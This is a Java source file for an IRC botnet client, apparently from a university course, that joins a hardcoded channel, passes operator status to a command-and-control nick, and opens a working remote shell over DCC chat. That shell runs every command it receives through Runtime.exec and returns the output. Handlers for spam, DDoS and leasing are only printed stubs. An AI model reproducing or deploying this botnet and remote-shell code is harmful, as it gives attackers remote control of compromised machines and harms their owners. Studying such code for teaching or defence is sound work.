import java.io.*;
import java.net.*;
import java.util.*;

import org.jibble.pircbot.*;

public class BotnetClient extends PircBot {
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "bot";
	private static final String CC = "RandR";
	private static final int PORT = 6667;
	private String uuid;
	private String id;
	private Scanner input;
	private String operator;
	private ChatThread chat;
	
	public static void main(String[] args) {
		BotnetClient bn = new BotnetClient();
	}
	
	public BotnetClient() {
		//MsgEncrypt cipher = MsgEncrypt.getInstance(key, secretKey);
		uuid = UUID.randomUUID().toString();
		id = NAME + "_" + uuid;
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(id);
			setMessageDelay(0);
			connect(SERVER, PORT);
			joinChannel(CHANNEL);
			setMode(CHANNEL, "+s");
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			uuid = UUID.randomUUID().toString();
			id = NAME + "_" + uuid;
			changeNick(id);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
		
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		message = message.toLowerCase();
		if (message.startsWith("shell")) {
			System.out.println("Exposing Shell");
		} else if (message.startsWith("spam")) {
			System.out.println("Sending Spam");
		} else if (message.startsWith("ddos")) {
			System.out.println("DDOSing");
		} else if (message.startsWith("lease")) {
			System.out.println("Leasing Myself");
		} else {
			System.out.println("<" + sender + ">: " + message);
		}
	}
	
	protected void onOp(String channel, String sourceNick, String sourceLogin, String sourceHostname, String recipient) {
		operator = recipient;
	}
	
	protected void onJoin(String channel, String sender, String login, String hostname) {
		if (id.equals(operator) && sender.equals(CC)) {
			op(CHANNEL, sender);
			deOp(CHANNEL, id);
			System.out.println("Operator status given to " + CC);
		} else {
			System.out.println("Current op:" + operator);
		}
	}
	

	protected void onIncomingChatRequest(DccChat chatObj) {
		chat = new ChatThread(chatObj);
	}
	
	public void write(String s) {
		sendMessage(CHANNEL, s);
	}
	
	private class ChatThread extends Thread {
		DccChat chat;
		public ChatThread(DccChat chat) {
			this.chat = chat;
			try {
				if (chat.getNick().equalsIgnoreCase(CC)) {
					chat.accept();
				} else {
					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
				}
			} catch(Exception e) {
				System.out.println(e.getMessage());
			}
			this.start();
		}
		public void run() {
			Runtime r = Runtime.getRuntime();
			try {
	        	chat.sendLine("$: ");
	        	String command = chat.readLine();
	        	System.out.println("Command: " + command);
	        	while (!command.equalsIgnoreCase("quit shell")) {
	        		Process p = r.exec(command);
	        		Scanner in = new Scanner(p.getInputStream());
	        		PrintWriter out = new PrintWriter(chat.getBufferedWriter());
	        		p.waitFor();
	        		String response = "";
	        		while (in.hasNextLine()) {
	        			response += in.nextLine() + "\n";
	        		}
	        		System.out.println(response);
	        		out.print(response + "\n$: ");
	        		command = chat.readLine();
	        	}
	        	chat.close();
		     } catch (Exception e) {
		    	 e.printStackTrace();
		     }
		}
	}
}
/*

M' = enc(json(M, mac, nonce))
M = de-json(dec(M'))

*/




